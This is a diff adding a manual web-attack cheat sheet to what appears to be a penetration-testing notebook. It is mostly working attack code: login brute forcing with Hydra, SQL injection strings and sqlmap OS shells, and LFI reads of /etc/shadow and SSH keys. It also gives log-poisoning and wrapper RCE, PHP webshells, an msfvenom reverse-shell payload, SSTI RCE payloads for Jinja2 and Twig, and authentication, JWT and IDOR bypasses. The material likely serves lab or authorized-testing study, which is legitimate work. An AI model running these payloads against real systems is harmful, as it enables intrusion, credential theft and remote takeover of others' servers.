@@ -468,6 +468,301 @@ rm $TOOLKIT_ROOT/web/TARGET_PORT_PROTO/artifacts/web/progress.log
 
 ---
 
+---
+
+## What the Script Won't Find — Manual Web Testing
+
+> [!important] webenum.sh finds the surface. These are the attacks the tool cannot automate — you need to do these manually when the automated run returns no foothold vector.
+
+---
+
+### When Directory Busting Finds Nothing
+
+The wordlist didn't match the naming convention. Try different wordlists:
+
+```bash
+# Technology-specific wordlists
+gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,txt
+gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt        # IIS
+gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt      # Apache
+gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt      # Spring
+
+# Case-sensitive variations (IIS is case-insensitive, Linux is not)
+# If Linux target: try lowercase, uppercase, capitalized
+gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/common.txt
+
+# Common backup/config file patterns
+for ext in bak old backup swp ~ .orig; do
+  curl -sk "http://IP/index.php${ext}" -o /dev/null -w "index.php${ext}: %{http_code}\n"
+done
+
+# Parameter fuzzing on pages that return 200
+ffuf -u "http://IP/index.php?FUZZ=test" \
+  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -fc 404 -t 20 -v
+```
+
+---
+
+### Login Pages — When Default Creds Don't Work
+
+The script doesn't brute-force web login forms. If you have a login page:
+
+```bash
+# Identify the form fields first (use curl or browser DevTools)
+curl -sk http://IP/login -v 2>&1 | grep -iE 'input|form|action'
+
+# Hydra HTTP POST form brute force
+# Syntax: "POST_PATH:POST_BODY:FAIL_STRING"
+hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form \
+  "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 10
+
+# Common default credentials to try manually first (faster than brute force)
+# admin:admin, admin:password, admin:admin123, admin:(blank)
+# administrator:administrator, root:root, user:user
+# App-specific: tomcat:tomcat, manager:manager, pi:raspberry
+# Check the app version → searchsploit for default creds
+
+# SQLi in login field — try these manually before running sqlmap
+admin'--
+admin'#
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+admin' OR '1'='1'--
+```
+
+---
+
+### SQL Injection — When You Find a Form or Parameter
+
+```bash
+# Quick test — if the page errors or behaves differently, it's injectable
+curl -sk "http://IP/page.php?id=1'"          # single quote error
+curl -sk "http://IP/page.php?id=1 AND 1=1"  # should return same as ?id=1
+curl -sk "http://IP/page.php?id=1 AND 1=2"  # should return different/empty
+
+# Automated scan (run in background — can take time)
+sqlmap -u "http://IP/page.php?id=1" --batch --dbs --level 3 --risk 2
+
+# If POST form
+sqlmap -u "http://IP/login" --data "username=admin&password=pass" --batch --dbs
+
+# SQLi to RCE (if MySQL with FILE privilege or MSSQL with xp_cmdshell)
+# MySQL
+sqlmap -u "http://IP/page.php?id=1" --batch --os-shell
+# MSSQL
+sqlmap -u "http://IP/page.php?id=1" --batch --os-shell --dbms mssql
+```
+
+---
+
+### Local File Inclusion (LFI)
+
+If the URL has a `page=`, `file=`, `path=`, `include=`, `lang=`, or similar parameter:
+
+```bash
+# Basic test
+curl -sk "http://IP/page.php?file=../../../../etc/passwd"
+curl -sk "http://IP/page.php?file=....//....//....//etc/passwd"   # filter bypass
+curl -sk "http://IP/page.php?file=/etc/passwd%00"                 # null byte (old PHP)
+
+# Windows targets
+curl -sk "http://IP/page.aspx?file=../../../../windows/win.ini"
+curl -sk "http://IP/page.aspx?file=C:\windows\win.ini"
+
+# LFI to RCE via log poisoning (Apache)
+# 1. Poison the access log with PHP code in User-Agent
+curl -sk http://IP/ -A "<?php system(\$_GET['cmd']); ?>"
+# 2. Include the log and execute
+curl -sk "http://IP/page.php?file=../../../../var/log/apache2/access.log&cmd=id"
+
+# LFI to RCE via PHP wrappers
+curl -sk "http://IP/page.php?file=php://filter/convert.base64-encode/resource=index.php"
+# Decode the output: echo 'BASE64STRING' | base64 -d > source.php
+curl -sk "http://IP/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
+
+# Useful LFI targets (Linux)
+/etc/passwd
+/etc/shadow
+/home/user/.ssh/id_rsa
+/var/log/apache2/access.log
+/var/log/auth.log
+/proc/self/environ
+/proc/net/fib_trie                              # internal IP ranges
+
+# Useful LFI targets (Windows)
+C:\Windows\win.ini
+C:\inetpub\wwwroot\web.config
+C:\Windows\System32\drivers\etc\hosts
+```
+
+---
+
+### File Upload — When You Find an Upload Form
+
+```bash
+# Test what's accepted — try in this order:
+# 1. Direct .php upload
+# 2. .php5, .phtml, .phar, .php3 (bypasses extension blacklists)
+# 3. Rename: shell.php.jpg (double extension)
+# 4. Case variation: shell.PhP, shell.PHP
+# 5. Content-Type bypass: change Content-Type to image/jpeg while keeping .php extension
+# 6. Magic bytes: prepend GIF89a; to the PHP payload
+
+# Basic PHP webshell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+# If the app checks MIME type, forge it with curl:
+curl -sk -X POST http://IP/upload \
+  -F "file=@shell.php;type=image/jpeg" \
+  -F "submit=Upload"
+
+# After upload, find the file path from the response or by guessing:
+curl -sk "http://IP/uploads/shell.php?cmd=id"
+curl -sk "http://IP/files/shell.php?cmd=id"
+
+# ASPX webshell for Windows/IIS
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f aspx > shell.aspx
+# Then upload shell.aspx and visit it while Penelope is listening
+```
+
+---
+
+### Server-Side Template Injection (SSTI)
+
+If the app reflects your input back (name fields, search boxes, custom messages):
+
+```bash
+# Probe — inject template expressions and see if they evaluate
+# In the vulnerable field, try each:
+{{7*7}}          # if you see 49, it's Jinja2/Twig
+${7*7}           # FreeMarker, Velocity
+<%= 7*7 %>       # ERB (Ruby)
+#{7*7}           # Thymeleaf
+
+# Jinja2 RCE (Python/Flask)
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+# Twig RCE (PHP)
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+```
+
+---
+
+### HTTP Verb Tampering and Method Abuse
+
+```bash
+# Check what verbs the server accepts
+curl -sk -X OPTIONS http://IP/ -v 2>&1 | grep -i allow
+
+# TRACE — if enabled, reflects request headers (useful for XST, shows auth headers)
+curl -sk -X TRACE http://IP/ -v
+
+# PUT — if allowed, try writing files (WebDAV)
+curl -sk -X PUT http://IP/shell.php -d "<?php system(\$_GET['cmd']); ?>"
+davtest -url http://IP       # tests all verbs + file upload capabilities
+
+# Method override — some apps check X-HTTP-Method-Override
+curl -sk -X POST http://IP/admin -H "X-HTTP-Method-Override: DELETE"
+
+# HEAD instead of GET — sometimes bypasses auth checks
+curl -sk -I http://IP/admin/config.php
+```
+
+---
+
+### Authentication Bypass
+
+When you find a login form that tools can't crack:
+
+```bash
+# Try direct access to admin pages (no login required?)
+curl -sk http://IP/admin/
+curl -sk http://IP/dashboard/
+curl -sk http://IP/manage/
+
+# Path traversal to bypass auth middleware
+curl -sk http://IP/..;/admin/
+curl -sk http://IP/%2e%2e/admin/
+
+# Cookie manipulation — if you see a role=user or admin=false cookie
+# Change it in Burp or via curl:
+curl -sk http://IP/admin -H "Cookie: role=admin; session=your_session_token"
+
+# JWT tampering — if you see a JWT token (three base64 parts separated by dots)
+# Decode: echo "PAYLOAD_PART" | base64 -d
+# Try: change "role":"user" to "role":"admin", then re-sign with empty secret
+# Tool: jwt_tool eyJhbGciOiJIUzI1NiJ9... -T      # interactive tamper
+
+# IDOR — change numeric IDs in URLs
+curl -sk http://IP/api/user/1        # your profile
+curl -sk http://IP/api/user/2        # someone else's
+curl -sk http://IP/api/user/0
+curl -sk http://IP/api/user/100
+```
+
+---
+
+### API Enumeration
+
+When the site seems like an API or has JavaScript that makes XHR calls:
+
+```bash
+# Check JavaScript source for API endpoints
+curl -sk http://IP/ | grep -oP '(api|v[0-9]|rest|graphql)[^\s"\'<>]*' | sort -u
+
+# Common API paths
+for path in /api /api/v1 /api/v2 /rest /graphql /swagger /swagger.json /openapi.json; do
+  code=$(curl -sk -o /dev/null -w "%{http_code}" "http://IP${path}")
+  echo "$path: $code"
+done
+
+# Swagger/OpenAPI gives you all endpoints
+curl -sk http://IP/swagger.json | python3 -m json.tool | grep '"path"'
+curl -sk http://IP/api/swagger.json
+curl -sk http://IP/v2/swagger.json
+
+# GraphQL introspection
+curl -sk -X POST http://IP/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{__schema{types{name fields{name}}}}"}'
+
+# ffuf against API paths specifically
+ffuf -u http://IP/api/FUZZ \
+  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
+  -mc 200,201,401,403 -v
+```
+
+---
+
+### Source Code and Sensitive File Discovery
+
+```bash
+# Git repo exposed
+curl -sk http://IP/.git/HEAD         # if "ref: refs/heads/master" → git is exposed
+git-dumper http://IP/.git/ ./git_dump
+cd git_dump && git log --oneline     # check commit history
+git show HEAD                        # view latest commit
+git log --all --oneline | head -20   # all branches/commits
+
+# Common sensitive files
+for f in .env .env.backup .env.local config.php wp-config.php \
+          database.yml settings.py secrets.py .htpasswd phpinfo.php \
+          info.php server-status server-info crossdomain.xml \
+          sitemap.xml .DS_Store package.json composer.json; do
+  code=$(curl -sk -o /dev/null -w "%{http_code}" "http://IP/${f}")
+  [[ "$code" != "404" ]] && echo "$f: $code"
+done
+
+# Source code disclosure via path tricks
+curl -sk http://IP/index.php.bak
+curl -sk "http://IP/index.php%20"    # trailing space (IIS)
+curl -sk "http://IP/index.php."      # trailing dot (IIS)
+```
+
+---
+
 ## Related
 
 - [[scripts/recon]] — run this first to find HTTP services
